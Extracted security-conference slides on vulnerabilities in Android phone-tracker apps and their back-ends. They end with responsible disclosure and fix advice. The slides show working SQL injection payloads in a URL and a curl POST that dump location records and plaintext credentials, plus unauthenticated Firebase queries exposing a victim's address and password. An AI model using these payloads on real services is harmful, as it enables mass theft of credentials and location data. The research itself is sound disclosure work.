103
Part2: Who Needs Authentication?
§ What happens if user_id is empty?
attacker
tracker back-end
All messages of all users!
TEXT
TEXT
TEXT
TEXT
TEXT
104
SQL – Very Simple
105
Back-end Attack to Track all User
http://*********/FindMyFriendB/fetch_family.php?mobile=
back-end API extraction
106
Back-end Attack to Track all User
[{"to_username":“*****","to_mobile":"9********9","lat":"*0.2916455","
lon":"7*.0521764","time":"12:0,27-12-2016"}]
http://*********/FindMyFriendB/fetch_family.php?mobile=
back-end API extraction
107
Simple SQL Injection
http://*********/FindMyFriendB/fetch_family.php?mobile=' or '' ='
back-end API extraction
108
Simple SQL Injection
back-end API extraction
[{"to_username":“***","to_mobile":"9********4","lat":"2*.644490000000005","lon":"*8.35368","time":"18:55,04-12-
2016"},{"to_username":“****","to_mobile":"9******9","lat":“*0.2916455","lon":“*8.0521764","time":"12:0,27-12-
2016"},{"to_username":“****","to_mobile":"9********2","lat":“*3.8710253","lon":“*5.6093338","time":"18:6,19-11-
2016"},{"to_username":“****","to_mobile":"9*******2","lat":“*6.5958902","lon":"-*7.3897167","time":"13:46,04-12-
2016"},{"to_username":“****","to_mobile":"9*******0","lat":“*2.621241065689713","lon":“*8.33497756126259","time":"9:2
5,20-11-2016"},{"to_username":“****","to_mobile":"4********1","lat":“*1.8925267","lon":"-*1.3928747","time":"3:26,12-
022017"},{"to_username":"","to_mobile":"","lat":"","lon":"","time":""},{"to_username":“***","to_mobile":"9********8",
"lat":“*5.262387837283313","lon":“*4.10851701162755","time":"23:47,20-11-
2016"},{"to_username":“****","to_mobile":"9*******6","lat":"0","lon":"0","time":"12:35"},{"to_username":“***","to_mob
ile":"8********5","lat":“*5.3401165","lon":“*5.1459643","time":"8:45,21-11-
2016"},{"to_username":“****","to_mobile":"8********8","lat":"0","lon":"0","time":"0:32"},{"to_username":“****","to_mo
bile":"9********2","lat":“*2.4393024","lon":"-*5.0414924","time":"23:0,20-11-
2016"},{"to_username":“****","to_mobile":"9********8","lat":“*2.4386613","lon":"-*5.0398665","time":"7:14,21-11-
2016"},{"to_username":“****","to_mobile":"8********6","lat":“*3.7005867","lon":“*6.9793598","time":"17:33,24-12-
2016"},{"to_username":“****","to_mobile":"8********5","lat":“*2.584631","lon":“*8.2787425","time":"20:56,22-11-
2016"},{"to_username":“*****","to_mobile":"8********1","lat":“*2.7993167","lon":“*6.2369126","time":"17:49,26-11-
2016"},{"to_username":“****","to_mobile":"9*******5","lat":“*2.5846746","lon":“*8.2787492","time":"18:28,21-11-
2016"},{"to_username":“***","to_mobile":"8*******7","lat":“*2.4069115","lon":"-*1.1435983",...
109
http://*********/FindMyFriendB/fetch_family.php?mobile=' or '' ='
SQL - Simple
110
Accessing Images 
§ Cloud storage for images
111
Accessing Images 
§ Cloud storage for images
§ One cloud for all images
112
Accessing Images 
§ Cloud storage for images
§ One cloud for all images
§ User authentication required
§ Filter corresponding images by user id
113
Accessing Images 
§ Cloud storage for images
§ One cloud for all images
§ User authentication required
§ Filter corresponding images by user id
§ Bypass cloud authentication to get access to all images
114
Demo Time!
115
Get all User Credentials
§ App provides an API and a process for reinstallation of the app
1.
App checks if user already has an account
2.
Sends device id to the server
POST http://push001.***********/***********/v5/
Content-Type: application/json
{"method":"getuserid","deviceid":"c1b86d87ed6f51011c0d53a654f16455"}
116
Get all User Credentials
§ App provides an API and a process for reinstallation of the app
1.
App checks if user already has an account
2.
Sends device id to the server
3.
Server checks if id exists and responses with:
username, password and email
POST http://push001.***********/***********/v5/
Content-Type: application/json
{"method":"getuserid","deviceid":"c1b86d87ed6f51011c0d53a654f16455"}
117
Attack Strategy
§ Spoofing the device id will deliver us credentials
§ BUT device id generation is relative complex and guessing is unlikely
118
Attack Strategy
§ Spoofing the device id will deliver us credentials
§ BUT device id generation is relative complex and guessing is unlikely
§ Empty id trick does not work L
POST http://push001.***********/***********/v5/
Content-Type: application/json
{"method":"getuserid","deviceid":" "}
119
Attack Strategy
§ Spoofing the device id will deliver us credentials
§ BUT device id generation is relative complex and guessing is unlikely
§ Empty id trick does not work L
§ Let‘s try SQL injection again J
POST http://push001.***********/***********/v5/
Content-Type: application/json
{"method":"getuserid","deviceid":" ' or 1=1   limit 1 offset 5 -- "}
120
SQL-Injection
§ Curl Command:
curl -H "Content-Type: application/json" -X POST 
-d "{\"method\":\"getuserid\",
\"deviceid\":\" ' or 1=1   limit 1 offset 5 --
\"}" 
http://push001.***********/*********/v5/
121
SQL-Injection
§ Curl Command:
§ Result:
curl -H "Content-Type: application/json" -X POST 
-d "{\"method\":\"getuserid\",
\"deviceid\":\" ' or 1=1   limit 1 offset 5 --
\"}" 
http://push001.***********/*********/v5/
{"result":"success",
"id":"yb*****","pass":"y********4","email":"y*****@hanmail.net"}
plaintext password
122
SQL-Injection
§ Curl Command:
§ Result:
curl -H "Content-Type: application/json" -X POST 
-d "{\"method\":\"getuserid\",
\"deviceid\":\" ' or 1=1   limit 1 offset 6 --
\"}" 
http://push001.***********/*********/v5/
{"result":"success",
"id":"se*****","pass":"qwe*******4","email":"se*****@gmail.com"}
plaintext password
iterate over the offset
123
SQL-Injection
§ Curl Command:
curl -H "Content-Type: application/json" -X POST 
-d "{\"method\":\"getuserid\",
\"deviceid\":\" ' or 1=1   limit 1 offset 1700400 --
\"}" 
http://push001.***********/*********/v5/
iterate over the offset
> 1.700.000 plaintext credentials
124
125
WTF?
Firebase
https://firebase.google.com/
126
Authentication Misconfiguration
attacker
tracker back-end
POST /*******celltracker/api/login HTTP/1.1
{"user_email":"PI:EMAIL"}
victim email
127
Authentication Misconfiguration
attacker
tracker back-end
user_email
user_id
PI:EMAIL
149737514214639
PI:EMAIL
145859345853234
…
…
FREE
128
POST /*******celltracker/api/login HTTP/1.1
{"user_email":"PI:EMAIL"}
victim email
Authentication Misconfiguration
attacker
tracker back-end
HTTP/1.1 200 OK
{"login_data":[{"user_id":"149737514214639",…}
user_email
user_id
PI:EMAIL
149737514214639
PI:EMAIL
145859345853234
…
…
FREE
129
Authorisation Misconfiguration
attacker
https://*****************.firebaseio.com/Users/149737514214639
130
Authorisation Misconfiguration
attacker
user_id
last_location
…
149737514214639
address = …
…
145859345853234
address = …
…
…
…
…
Table Users
Query in Users
FREE
131
https://*****************.firebaseio.com/Users/149737514214639
Location without Authorisation
attacker
HTTP/1.1 200 OK
{
last_location={
address= Rheinstraße 75 64295 Darmstadt Germany
date=13/06/2017
lat=49.8717048
long=8.6387116
…
}
132
Faceplam Light
133
But there is More
attacker
HTTP/1.1 200 OK
{ …
user_email=PI:EMAIL
user_name=theuser
user_password=123456
user_token=cQfgiDRWx9o:APA91bGTkU1N9F...
user_type=1
..
}
134
But there is More
attacker
HTTP/1.1 200 OK
{ …
user_email=PI:EMAIL
user_name=theuser
user_password=123456
user_token=cQfgiDRWx9o:APA91bGTkU1N9F...
user_type=1
..
}
135
But there is More
HTTP/1.1 200 OK
{ …
user_email=PI:EMAIL
user_name=theuser
user_password=123456
user_token=cQfgiDRWx9o:APA91bGTkU1N9F...
user_type=1
..
}
public void onDataChange(DataSnapshot
dataSnapshot) {
PasswordActivity.this.util.log("userid
password123", "" + dataSnapshot.getValue());
if(PasswordActivity.get_string_from_edittext(PasswordActivity.ed_password).compareToIgnoreCase(
dataSnapshot.getValue().toString()) == 0) {
....
PasswordActivity.this.save_user_data();
return;
}
PasswordActivity.lDialog.dismiss();
PasswordActivity.this.util.toast("Password Wrong");
}
136
Authorisation Misconfiguration
attacker
https://*****************.firebaseio.com/Users/
no user_id
137
Authorisation Misconfiguration
attacker
user_id
last_location
…
149737514214639
address = …
…
145859345853234
address = …
…
…
…
…
Table Users
FREE
138
Sh** happens
139
Problems?
§ Misconfiguration of Firebase, no authorization rules
*https://firebase.google.com/docs/auth/
140
Problems?
§ Misconfiguration of Firebase, no authorization rules
§ User authentication is done on app (client) side, user authentication must be 
done on server side
*https://firebase.google.com/docs/auth/
141
Problems?
§ Misconfiguration of Firebase, no authorization rules
§ User authentication is done on app (client) side, user authentication must be 
done on server side
§ Use Firebase SDK authentication (e.g. Google Sign-in, custom email -
password based, …*) 
*https://firebase.google.com/docs/auth/
142
Problems?
§ Misconfiguration of Firebase, no authorization rules
§ User authentication is done on app (client) side, user authentication must be 
done on server side
§ Use Firebase SDK authentication (e.g. Google Sign-in, custom email -
password based, …*) 
§ Custom authentication back-end possible (based on signed tokens, details 
see**)
*https://firebase.google.com/docs/auth/
**https://firebase.google.com/docs/auth/android/custom-auth
143
Agenda
§ Motivation
§ Background Information
§ Client-Side Authorization
§ Client-Side and Communication Vulnerabilities
§ Server-Side Vulnerabilities
§ Responsible Disclosure Process
§ Summary
144
Responsible Disclosure
§ Informed vendors, 90 days to fix the bugs 
§ Reactions:
§ A few: “We will fix it”
§ No reaction
§ “How much money do you want” 
§ “It’s not a bug, it’s a feature”
§ Announced to Google Android Security and to ASI (app security 
improvement)Team -> no direct reaction
§ Some apps removed from Google Play Store (12 of 19) 
§ Still vulnerable back-ends and apps in the store
§ Some apps are detected as malware now
145
Agenda
§ Motivation
§ Background Information
§ Client-Side Authorization
§ Client-Side and Communication Vulnerabilities
§ Server-Side Vulnerabilities
§ Responsible Disclosure Process
§ Summary
146
Summary
§ DON‘T use plaintext communication in mobile! 
147
Summary
§ DON‘T use plaintext communication in mobile! 
§ Use prepared statements (in correct way J) to avoid SQL injection
148
Summary
§ DON‘T use plaintext communication in mobile! 
§ Use prepared statements (in correct way J) to avoid SQL injection
§ App security is important but also consider back-end security
149
Summary
§ DON‘T use plaintext communication in mobile! 
§ Use prepared statements (in correct way J) to avoid SQL injection
§ App security is important but also consider back-end security
§ DON’T store any user secrets in the app (client side)
150
Summary
§ DON‘T use plaintext communication in mobile! 
§ Use prepared statements (in correct way J) to avoid SQL injection
§ App security is important but also consider back-end security
§ DON’T store any user secrets in the app (client side)
§ Google provides API for payment and license verification
§ Authentication and authorization for back-end data (e.g. firebase*)
*https://firebase.google.com/docs/auth/
151
Client-Side Vulnerability
Access All Data
My Family GPS Tracker 
X
KidControll GPS Tracker
X
Family Locator (GPS)
X
X
Free Cell Tracker
X
X
Rastreador de Novia 1
X
X
Rastreador de Novia 2
X
X
Phone Tracker Free
X
X
Phone Tracker Pro
X
X
Rastrear Celular Por el Numero
X
X
Localizador de Celular GPS
X
X
Rastreador de Celular Avanzado
X
X
Handy Orten per Handynr
X
X
Localiser un Portable avec son Numero
X
X
Phone Tracker By Number
X
X
Track My Family
X
X
Couple Vow
X
Real Time GPS Tracker
X
Couple Tracker App
X
Ilocatemobile
X
http://sit4.me/tracker-apps
152
153
Thanks to…
Alex, Daniel, Julien, Julius, 
Michael, Philipp, Steven, 
Kevin, Sebald
Stephan Huber
Email: PI:EMAIL
Findings: http://sit4.me/tracker-apps
Siegfried Rasthofer
Email: PI:EMAIL
Web: www.rasthofer.info
Twitter: @teamsik
Web: www.team-sik.org
154